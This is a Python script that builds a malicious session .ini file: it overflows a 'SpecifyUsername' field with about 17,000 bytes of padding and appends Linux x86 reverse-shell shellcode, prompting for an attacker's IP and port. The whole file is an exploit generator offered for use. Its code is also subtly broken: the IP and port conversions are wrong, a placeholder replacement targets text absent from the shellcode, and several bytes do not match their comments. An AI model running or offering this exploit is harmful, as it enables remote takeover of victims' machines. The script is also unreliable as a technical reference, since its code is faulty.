#!/usr/bin/env python

def generate_payload(ip, port, username):
    # Linux x86 shellcode template (reverse shell)
    shellcode = (
        "\x6a\x66"          # push $0x66 (socketcall)
        "\x58"              # pop %eax
        "\x6a\x01"          # push $0x1 (sys_socket)
        "\x5b"              # pop %ebx
        "\x6a\x02"          # push $0x2 (AF_INET)
        "\x52"              # push %edx
        "\x6a\x01"          # push $0x1 (SOCK_STREAM)
        "\x6a\x02"          # push $0x2
        "\x89\xe1"          # mov %esp,%ecx
        "\xcd\x80"          # int $0x80

        # Connect to attacker's IP/port
        "\x6a\x66"          # push $0x66 (socketcall)
        "\x58"              # pop %eax
        "\x6a\x03"          # push $0x3 (sys_connect)
        "\x5b"              # pop %ebx
        "\x68" + ip         # push attacker's IP (e.g., 192.168.1.88)
        "\x66\x68" + port   # push attacker's port (e.g., 0x697a = 31337)
        "\x66\x6a\x02"      # push $0x2 (AF_INET)
        "\x89\xe1"          # mov %esp,%ecx
        "\x6a\x10"          # push $0x10 (sockaddr size)
        "\x51"              # push %ecx
        "\x52"              # push %edx
        "\x89\xe1"          # mov %esp,%ecx
        "\xcd\x80"          # int $0x80

        # Spawn shell
        "\x6a\x0b"          # push $0xb
        "\x58"              # pop %eax
        "\x99"              # cdq
        "\x52"              # push %edx
        "\x66\x68\x2d\x70"  # push $0x702d
        "\x89\xe1"          # mov %esp,%ecx
        "\x52"              # push %edx
        "\x6a\x68"          # push $0x68
        "\x68\x2f\x62\x69"  # push $0x69622f2f
        "\x6e\x89\xe3"      # mov %esp,%ebx
        "\x52"              # push %edx
        "\x51"              # push %ecx
        "\x53"              # push %ebx
        "\x89\xe1"          # mov %esp,%ecx
        "\xcd\x80"          # int $0x80
    )

    # Convert IP/port to hex (e.g., 192.168.1.88 → \xc0\xa8\x01\x58)
    ip_hex = "\\x" + "\\x".join(f"{int(octet)}".zfill(2) for octet in ip.split("."))
    port_hex = "\\x" + "\\x".join(f"{int(port) >> 8:02x}", f"{int(port) & 0xff:02x}")

    # Replace placeholders with user input
    shellcode = shellcode.replace("192.168.1.88", ip_hex).replace("31337", port_hex)

    return "[Bookmarks]\nSpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode

def main():
    ip = input("Enter attacker's IP address: ").strip()
    port = input("Enter attacker's port (default: 443): ").strip() or "443"
    username = input("Enter SpecifyUsername value (default: 'hacked'): ").strip() or "hacked"

    payload = generate_payload(ip, port, username)
    print(f"\nGenerated payload:\n{payload}")

    # Save to file (optional)
    save = input("Save to file? (y/n): ").lower() == "y"
    if save:
        with open("malicious_session.ini", "w") as f:
            f.write(payload)
        print("Payload saved to malicious_session.ini")

if __name__ == "__main__":
    main()
